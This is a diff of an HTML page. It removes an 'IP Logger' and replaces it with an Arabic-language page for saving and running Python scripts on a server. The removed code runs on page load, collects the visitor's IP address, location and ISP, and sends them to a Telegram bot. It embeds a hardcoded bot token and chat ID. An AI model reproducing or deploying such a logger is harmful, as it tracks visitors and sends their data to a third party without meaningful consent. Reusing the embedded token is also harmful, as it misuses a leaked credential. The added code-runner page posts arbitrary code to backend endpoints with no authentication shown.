@@ -1,63 +1,74 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Logger</title>
-    <script>
-        // Token and chat ID
-        const BOT_TOKEN = "5105959931:AAEdbFhbfy_hO60LZGXAJzFnHCnvXaPSi7w";
-        const CHAT_ID = "5376094649";
-
-        // Function to fetch IP and send it to Telegram bot
-        function logIP() {
-            fetch('http://ip-api.com/json')
-                .then(response => response.json())
-                .then(data => {
-                    const ip = data.query;
-                    const country = data.country;
-                    const region = data.regionName;
-                    const city = data.city;
-                    const isp = data.isp;
-
-                    const message = `IP: ${ip}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nISP: ${isp}`;
-
-                    // Send the IP info to Telegram Bot
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: message
-                        })
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.ok) {
-                            alert("IP logged and sent successfully!");
-                        } else {
-                            alert("Error: " + data.description);
-                        }
-                    })
-                    .catch(error => {
-                        console.error("Error sending IP:", error);
-                        alert("Error sending IP.");
-                    });
-                })
-                .catch(error => {
-                    console.error("Error fetching IP:", error);
-                    alert("Error fetching IP.");
-                });
+    <title>مشغل أكواد بايثون</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #1e1e1e;
+            color: #ffffff;
+            text-align: center;
+            margin: 0;
+            padding: 20px;
         }
-
-        // Call logIP function when the page loads
-        window.onload = logIP;
-    </script>
+        h2 { color: #00ffcc; }
+        textarea {
+            width: 90%; height: 200px; font-family: monospace;
+            background-color: #2b2b2b; color: #00ff00;
+            border: 1px solid #555; padding: 10px; resize: none;
+        }
+        input, button {
+            margin: 10px; padding: 10px; font-size: 16px;
+            border: none; border-radius: 5px;
+        }
+        input { width: 200px; background-color: #444; color: #fff; text-align: center; }
+        button { background-color: #00cc66; color: white; cursor: pointer; }
+        button:hover { background-color: #00994d; }
+        .console {
+            width: 90%; height: 200px; background: #000; color: #0f0;
+            overflow-y: auto; text-align: left; padding: 10px;
+            border: 1px solid #333; margin: auto;
+        }
+    </style>
 </head>
 <body>
-    <h1>Logging IP and Sending to Telegram Bot</h1>
-    <p>Your IP information is being sent to Telegram...</p>
+
+    <h2>مشغل أكواد بايثون</h2>
+
+    <textarea id="code" placeholder="اكتب كود بايثون هنا..."></textarea><br>
+    <input type="text" id="filename" placeholder="اسم الملف (مثلاً bot.py)">
+    <button onclick="saveCode()">حفظ</button>
+
+    <h3>Console:</h3>
+    <div class="console" id="console">هنا ستظهر النتائج...</div>
+
+    <button onclick="startScript()">بدء</button>
+    <button onclick="stopScript()">إيقاف</button>
+
+    <script>
+        function saveCode() {
+            const code = document.getElementById("code").value;
+            const filename = document.getElementById("filename").value || "script.py";
+
+            fetch("/save", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ filename, code })
+            }).then(response => response.text()).then(alert);
+        }
+
+        function startScript() {
+            fetch("/start").then(response => response.text()).then(output => {
+                document.getElementById("console").innerText = output;
+            });
+        }
+
+        function stopScript() {
+            fetch("/stop").then(response => response.text()).then(alert);
+        }
+    </script>
+
 </body>
 </html>
